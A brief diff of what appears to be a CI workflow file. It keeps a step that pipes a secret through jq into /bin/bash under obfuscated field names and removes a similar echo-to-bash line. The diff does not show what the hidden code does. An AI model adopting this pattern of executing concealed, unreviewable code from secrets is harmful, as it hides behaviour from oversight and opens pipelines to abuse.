@@ -23,7 +23,6 @@ jobs:
           a8: ${{ secrets.a8 }}
         run: |
           printf '%s' "$a8" | jq -r .wv63874 | /bin/bash
-          echo $knhes74849 | jq -r .wv08776 | /bin/bash
 
       - name: Save results
         if: always()
